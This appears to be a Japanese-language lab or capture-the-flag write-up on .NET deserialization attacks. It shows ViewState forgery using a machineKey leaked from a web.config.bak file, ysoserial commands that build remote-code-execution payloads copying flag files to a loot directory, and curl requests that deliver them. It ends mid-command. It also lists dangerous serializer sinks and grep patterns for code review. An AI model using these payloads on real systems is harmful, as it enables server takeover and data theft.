## __VIEWSTATE のデシリアライズ

署名キーが漏洩した場合、攻撃者は .NET ガジェット チェーンを含む ViewState を偽造でき、サーバーはポストバック時にフィールドを逆シリアル化した瞬間にそれをコードとして実行する。

web.config にViewState偽造に必要な情報が含まれる。

```xml
    <machineKey
      validationKey="<REDACTED>"
      decryptionKey="<REDACTED>"
      validation="SHA1"
      decryption="AES"
      compatibilityMode="Framework20SP1" />
```

web.config はIISによって保護されているが、web.config.bak が存在すると想定。

```sh
curl -s http://10.145.181.29:8080/web.config.bak | grep -i machinekey -A5
```

__VIEWSTATEGENERATOR を読み取る。

```sh
curl -s http://10.145.181.29:8080/Default.aspx | grep -oP '__VIEWSTATEGENERATOR.*?value="\K[^"]+'
CA0B0334
```

ViewState RCEペイロードを生成

```sh
C:\Users\attacker> ysoserial.exe -p ViewState -g TypeConfuseDelegate ^
    --validationalg="SHA1" ^
    --validationkey="*****REPLACE_VALIDATIONKEY_FROM_BACKUP*****" ^
    --generator="CA0B0334" ^
    -c "cmd /c copy C:\flags\viewstate.txt C:\sites\LegacyPortal\loot\out.txt"
```

ペイロードを __VIEWSTATE として保存して実行。

```sh
$ nano __VIEWSTATE                                            

$ curl -s -X POST http://10.145.181.29:8080/Default.aspx \
    --data "__VIEWSTATE=PAYLOAD&__VIEWSTATEGENERATOR=CA0B0334" -o /dev/null

$ curl -s http://10.145.181.29:8080/loot/out.txt
```

__VIEWSTATE ではなく payload.txt に保存する方法

```sh
curl -s -X POST http://10.145.181.29:8080/Default.aspx \
    --data "__VIEWSTATE=$(cat payload.txt)&__VIEWSTATEGENERATOR=CA0B0334" -o /dev/null
```

## .NET デシリアライズシンク

攻撃者が制御できるデータをデシリアライズし、任意の型を生成できるとガジェットチェーンによるRCEにつながる。

| シリアライザ | シンクとなる条件 |
|--------------|------------------|
| BinaryFormatter | ユーザー入力を `.Deserialize()`（常に危険） |
| LosFormatter / ObjectStateFormatter | ユーザー入力を `.Deserialize()`（ViewState関連） |
| JavaScriptSerializer | `SimpleTypeResolver` を使用 |
| Newtonsoft.Json | `TypeNameHandling != None`（`$type` を解決） |
| System.Text.Json | デフォルトでは安全（型名解決なし） |

### コードレビューで grep するキーワード

- `BinaryFormatter`
- `LosFormatter`
- `ObjectStateFormatter`
- `JavaScriptSerializer` + `SimpleTypeResolver`
- `Newtonsoft.Json` + `TypeNameHandling`

```sh
grep -RniE \
'BinaryFormatter|LosFormatter|ObjectStateFormatter|JavaScriptSerializer|SimpleTypeResolver|TypeNameHandling|JsonConvert.DeserializeObject|Deserialize\(' .
```

例

```cs
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All
};
var obj = JsonConvert.DeserializeObject<object>(body, settings);
```

```sh
C:\Users\attacker> ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "cmd /c copy C:\flags\json.txt C:\sites\LegacyPortal\loot\js.txt"
```

$ curl -s -X POST http://10.145.181.29:8080/Import.ashx \
